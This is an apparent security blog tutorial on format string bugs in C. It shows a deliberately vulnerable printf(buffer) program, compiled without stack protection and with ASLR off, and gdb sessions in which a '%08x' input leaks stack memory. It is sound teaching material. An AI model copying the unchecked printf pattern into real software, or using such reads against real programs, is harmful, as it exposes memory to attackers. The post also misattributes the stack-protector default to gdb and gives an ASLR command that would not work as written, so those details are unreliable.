---
layout: post
title: subverting-printf
excerpt: "Using malformed printf statements to arbitrarily read and write memory."
categories: [tech]
tags: [itsec, howto]
comments: false
---

TODO: update instructions
To follow this post you may need a modicum of C know-how as well as some familiarity with `gdb`. In regards to compile flags, we're using `-g` to include debugging information (which will be used by `gdb`) and `-m32` to compile to 32 bits (I'm using a 64 bits machine and you probably are too) - but 32 bit is easier to understand. 

I'll also be using the `-fno-stack-protector` option which is enabled by default on modern versions of `gdb` and ASLR (Address Space Layout Reandomisation) has been disabled via `sudo echo 0 | tee /proc/sys/kernel/randomize_va_space`.

Note that I am supressing warnings with the `-w` flag - that's intentional and solely for the purpose of this exercise!

## `printf` calling convention

Let's start by looking at how `printf` is called from an assembly perspective. Here's the `C` code:

~~~ c
#include <stdlib.h>

int
main(int argc, char* argv[])
{
  unsigned int var = 0xAAAAAAAA;
  char buffer[512];
  strcpy(buffer, argv[1]);

  printf("Caller passed in string %s, var is located at 0x%08x", buffer, &var);
  printf("\n");

  exit(0);
}
~~~

Let's compile that and check the corresponding assembly in `gdb`:

~~~ shell
vagrant@vagrant:~/scratch$ gcc -m32 -g -fno-stack-protector -w printf_c.c
vagrant@vagrant:~/scratch$ gdb -q ./a.out
Reading symbols from ./a.out...done.
(gdb) list 10
5       main(int argc, char* argv[])
6       {
7         unsigned int var = 0xAAAAAAAA;
8         char buffer[512];
9         strcpy(buffer, argv[1]);
10
11        printf("Caller passed in string %s, var is located at 0x%08x", buffer, &var);
12        printf("\n");
13
14        exit(0);
(gdb) break 11
Breakpoint 1 at 0x80484d3: file printf_c.c, line 11.
(gdb) set disassemble-next-line on
(gdb) run foo
Starting program: /home/vagrant/scratch/a.out foo

Breakpoint 1, main (argc=2, argv=0xffffdc24) at printf_c.c:11
11        printf("Caller passed in string %s, var is located at 0x%08x", buffer, &var);
=> 0x080484d3 <main+56>:        83 ec 04                sub    esp,0x4
   0x080484d6 <main+59>:        8d 45 f4                lea    eax,[ebp-0xc]
   0x080484d9 <main+62>:        50                      push   eax
   0x080484da <main+63>:        8d 85 f4 fd ff ff       lea    eax,[ebp-0x20c]
   0x080484e0 <main+69>:        50                      push   eax
   0x080484e1 <main+70>:        68 90 85 04 08          push   0x8048590
   0x080484e6 <main+75>:        e8 55 fe ff ff          call   0x8048340 <printf@plt>
   0x080484eb <main+80>:        83 c4 10                add    esp,0x10
~~~ 

We see that we push 3 things on top of the stack before the `call`. Let's see those in more details:

~~~ shell
(gdb) break *0x080484e6
Breakpoint 2 at 0x80484e6: file printf_c.c, line 11.
(gdb) set disassemble-next-line off
(gdb) c
Continuing.

Breakpoint 2, 0x080484e6 in main (argc=2, argv=0xffffdc24) at printf_c.c:11
11        printf("Caller passed in string %s, var is located at 0x%08x", buffer, &var);
(gdb) x/4wx $esp
0xffffd950:     0x08048590      0xffffd96c      0xffffdb6c      0xf7fefe7a
(gdb) x/s 0x08048590
0x8048590:      "Caller passed in string %s, var is located at 0x%08x"
(gdb) x/s 0xffffd96c
0xffffd96c:     "foo"
(gdb) x/x 0xffffdb6c
0xffffdb6c:     0xaa
(gdb) x/4x 0xffffdb6c
0xffffdb6c:     0xaa    0xaa    0xaa    0xaa
~~~

As we can see, we have 3 addresses - each corresponding to an argument given to `printf`. The string to be interpolated is pushed first, and the arguments next. What would happen if we didn't pass any arguments at all?

## Reading arbitrary addresses

As we saw above, `printf` expects its arguments to be on the stack - and when they're passed in properly that works just fine. But sometimes people are forgetfull and end up doing the following:

~~~ c
#include <stdlib.h>
#include <stdio.h>

int
main(int argc, char* argv[])
{
  unsigned int var = 0xAAAAAAAA;
  char buffer[512];
  strcpy(buffer, argv[1]);

  printf(buffer);
  printf("\n");

  exit(0);
}
~~~

Which works as expected *as long as* the caller does not include a format string:

~~~ shell
vagrant@vagrant:~/scratch$ gcc -m32 -g -fno-stack-protector -w printf_c.c
vagrant@vagrant:~/scratch$ ./a.out hello
hello
vagrant@vagrant:~/scratch$ ./a.out hello%08x
helloffb5ad8b
~~~

When a format string is included, `printf` will look for the arguments on the stack. In the case above, it will grab the first thing available. This is clearer with `gdb`:

~~~ shell
vagrant@vagrant:~/scratch$ gdb -q ./a.out
Reading symbols from ./a.out...done.
(gdb) disass main
Dump of assembler code for function main:
   ...
   0x080484b1 <+22>:    mov    DWORD PTR [ebp-0xc],0xaaaaaaaa
   0x080484b8 <+29>:    mov    eax,DWORD PTR [eax+0x4]
   0x080484bb <+32>:    add    eax,0x4
   0x080484be <+35>:    mov    eax,DWORD PTR [eax]
   0x080484c0 <+37>:    sub    esp,0x8
   0x080484c3 <+40>:    push   eax
   0x080484c4 <+41>:    lea    eax,[ebp-0x20c]
   0x080484ca <+47>:    push   eax
   0x080484cb <+48>:    call   0x8048350 <strcpy@plt>
   0x080484d0 <+53>:    add    esp,0x10
   0x080484d3 <+56>:    sub    esp,0xc
   0x080484d6 <+59>:    lea    eax,[ebp-0x20c]
   0x080484dc <+65>:    push   eax
   0x080484dd <+66>:    call   0x8048340 <printf@plt>
   ...
---Type <return> to continue, or q <return> to quit---q
Quit
(gdb) break *0x080484dd
Breakpoint 1 at 0x80484dd: file printf_c.c, line 11.
(gdb) x/4wx $esp
0xffffd950:     0xffffd96c      0xffffdd74      0xf7ffcf1c      0xf7fefe7a
(gdb) x/s 0xffffd96c
0xffffd96c:     "hello%x"
(gdb) x/4x 0xffffdd74
0xffffdd74:     0x68    0x65    0x6c    0x6c
(gdb) n
12        printf("\n");
(gdb) n
helloffffdd74
~~~


